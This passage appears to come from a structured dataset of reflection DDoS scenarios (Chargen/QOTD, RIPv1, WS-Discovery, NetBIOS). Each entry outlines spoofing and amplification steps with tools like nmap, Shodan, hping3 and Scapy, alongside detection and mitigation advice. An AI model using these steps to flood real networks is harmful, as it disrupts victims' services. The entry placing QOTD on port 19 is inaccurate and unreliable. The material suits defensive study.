Attack Steps: Step 1: Attacker scans the internet using nmap or search engines like Shodan to locate systems with TCP or UDP port 19 open, which may be running Chargen or QOTD services.Step 2: Sends a spoofed request to these services using hping3 or Scapy, setting the source IP to be the victim's address.Step 3: Chargen responds with a stream of random or repeating characters; QOTD responds with a quote or message of the day — both sent to the victim’s IP.Step 4: Multiple such responses from different legacy systems result in a reflection flood.Step 5: Amplification factor ranges from 17x to 30x depending on implementation.Step 6: While uncommon today, embedded systems or old networking gear may still expose port 19.Step 7: Detection involves unexpected port 19 traffic and unsolicited data flows.Step 8: Defenders must disable or remove legacy services entirely.Step 9: Block TCP/UDP port 19 traffic at perimeter firewalls.Step 10: Ensure modern OS builds do not re-enable such services during upgrades.
Impact: Medium DDoS potential via legacy protocols
Detection Method: Watch for port 19 activity; alert on reflection spikes
Solution: Disable Chargen/QOTD; firewall block port 19; audit for legacy service presence

Title: RIPv1 Reflection
Attack Type: Route Table Reflection DDoS via RIPv1
Scenario Description: Attackers send spoofed RIP (Routing Information Protocol) requests to routers, which reply with routing tables to the spoofed victim IP.
Attack Steps: Step 1: Attacker identifies routers that still run Routing Information Protocol v1 (RIP) over UDP port 520 using scanning tools like nmap or ripwn.Step 2: Crafts a spoofed RIP request packet with the victim's IP as the source address.Step 3: Sends the spoofed RIP request to vulnerable routers.Step 4: The routers reply by sending their entire routing tables to the victim’s IP.Step 5: Because RIPv1 does not authenticate requests or verify source IPs, these responses are sent without challenge.Step 6: The responses, though not massive in size, can still contribute to bandwidth exhaustion if many routers are involved.Step 7: Detection includes UDP/520 traffic to unexpected destinations and unsolicited route updates.Step 8: Defenders should disable RIP unless required and replace with more secure routing protocols.Step 9: Firewalls must block inbound UDP/520 from untrusted sources.Step 10: Router firmware should support modern RIPv2 with authentication or OSPF.
Vulnerability: RIPv1 responds with routing info to spoofed IPs
Detection Method: Monitor UDP/520 traffic; detect anomalous route updates
Solution: Replace RIPv1; use RIPv2 with auth or OSPF; restrict RIP to trusted networks only

Title: WS-Discovery Reflection
Attack Type: UPnP Device Discovery Reflection via Port 3702
Scenario Description: WS-Discovery (used by UPnP and printers) replies to spoofed UDP requests, enabling attackers to use it for reflection/amplification attacks.
Tools Used: nmap, Scapy, Shodan, IoT discovery tools
Attack Steps: Step 1: Attacker uses IoT search engines like Shodan or scanning tools like nmap to discover devices exposing WS-Discovery over UDP port 3702.Step 2: Crafts a spoofed WS-Discovery probe request (usually XML-based), setting the victim’s IP as the source address.Step 3: Sends this spoofed probe to hundreds or thousands of exposed devices (e.g., printers, IP cameras, DVRs).Step 4: Each device responds with detailed XML discovery responses back to the victim’s IP, leading to an amplified UDP flood.Step 5: WS-Discovery responses are larger than requests, resulting in 10x–35x amplification depending on device.Step 6: Detection involves seeing unsolicited UDP/3702 traffic or printer traffic to external IPs.Step 7: Defenders should disable WS-Discovery on internet-facing printers and IP cameras.Step 8: Use internal firewalls to block UDP/3702 from untrusted networks.Step 9: Vendors should patch devices to ignore unauthenticated WS-Discovery probes.Step 10: Apply egress filtering to prevent spoofed traffic.
Detection Method: Monitor UDP/3702 traffic; detect unsolicited device discovery floods
Solution: Disable WS-Discovery on edge; firewall block 3702; update firmware of IoT devices

Title: NetBIOS Reflection
Attack Type: Reflection DDoS via NetBIOS Name Service (NBNS)
Scenario Description: Attackers send spoofed NetBIOS name queries to UDP/137, and the vulnerable system replies with 2–5x larger response to victim, enabling basic reflection DDoS.
